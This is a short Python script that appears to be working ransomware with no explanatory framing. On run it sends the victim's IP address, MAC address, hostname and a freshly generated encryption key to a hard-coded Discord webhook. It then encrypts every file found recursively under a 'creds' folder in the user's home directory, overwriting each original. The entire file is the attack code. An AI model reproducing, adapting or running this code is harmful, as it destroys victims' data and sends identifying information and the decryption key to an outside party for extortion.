
from socket import gethostname
from cryptography.fernet import Fernet
import os
import glob
import requests
import getmac 
import random
import json

wh_url = "https://discord.com/api/webhooks/1002749565662924852/YGnW8SZno4rti0ZzrPcP7thz03AgorJN1vzwDDsGvziX0Zcshz_ceoIcxuO_d9TvUYT-"
ip = requests.get("https://api.ipify.org", headers={'User-Agent':'google.com'})
mac = getmac.get_mac_address()

key = Fernet.generate_key()
webhook_data = {"username": "0verfl0w's BOT", "embeds": [
    dict(title="Encrypted a System.",
         color=f'{random.randint(0, 0xFFFFFF)}',
         fields=[
             {
                 "name": "*E/D Key**",
                 "value": f'||{key}||',
                 "inline": True
             },
             {
                 "name": "**IP Address**",
                 "value": f'`{ip.text}`',
                 "inline": True
             },
             {
                 "name": "**PC info**",
                 "value": f"mac: `{mac}` \nPC name: `{gethostname()}`",
                 "inline": True

             },
         ]),
]}
requests.post(wh_url, data=json.dumps(webhook_data), headers={'Content-Type':'application/json'})



homeDir = os.path.expanduser("~")

files = glob.glob(f'{homeDir}\\creds\\**\\*.*', recursive=True)
 
with open("key.key", "wb") as KeyFile:
    KeyFile.write(key)

fernet = Fernet(key)

for file in files:    

    with open(file, "rb") as tf:
        tf_bytes = tf.read()

    tf_bytes_enc = fernet.encrypt(tf_bytes)    


    with open(file, "wb") as tf:
        tf.write(tf_bytes_enc)
